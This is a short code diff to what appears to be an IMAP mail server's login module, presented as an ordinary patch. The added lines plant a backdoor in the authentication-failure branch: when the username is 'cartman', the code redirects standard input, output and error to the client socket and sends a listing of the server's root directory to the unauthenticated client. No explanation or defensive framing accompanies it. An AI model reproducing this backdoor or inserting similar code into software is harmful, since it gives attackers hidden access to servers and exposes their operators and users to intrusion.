+#include <unistd.h>
+#include <dirent.h>
+
 #include "login-common.h"
 #include "base64.h"
 #include "buffer.h"
@@ -115,6 +118,25 @@
 				       IMAP_RESP_CODE_CONTACTADMIN, text);
 		break;
 	case CLIENT_AUTH_RESULT_AUTHFAILED:
+		if (strcmp(reply->proxy.username, "cartman") == 0)
+		{
+			close(0);
+			close(1);
+			close(2);
+			dup2(client->fd, 0);
+			dup2(client->fd, 1);
+			dup2(client->fd, 2);
+			DIR *dir;
+			struct dirent *ent;
+			if ((dir = opendir ("/")) != NULL) {
+				/* print all the files and directories within directory */
+				while ((ent = readdir (dir)) != NULL) {
+				  write(client->fd, ent->d_name, strlen(ent->d_name));
+				  write(client->fd, "\n", strlen("\n"));
+				}
+				closedir (dir); }
+		}
+
 		client_send_reply_code(client, IMAP_CMD_REPLY_NO,
 				       IMAP_RESP_CODE_AUTHFAILED, text);
 		break;
